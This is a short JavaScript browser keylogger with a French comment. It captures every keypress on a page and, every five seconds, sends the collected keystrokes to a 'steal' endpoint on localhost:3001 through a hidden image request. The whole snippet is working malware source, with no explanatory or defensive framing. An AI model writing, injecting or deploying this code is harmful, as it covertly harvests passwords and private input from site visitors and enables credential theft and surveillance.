var k=[]; 
document.addEventListener('keydown', function(e) {
    k.push(e.key);
});
setInterval(function() {
    if (k.length > 0) {
        var i = new Image();
        i.src = 'http://localhost:3001/steal?keys=' + encodeURIComponent(k.join(''));
        k = []; // Réinitialiser les frappes après l'envoi
    }
}, 5000);
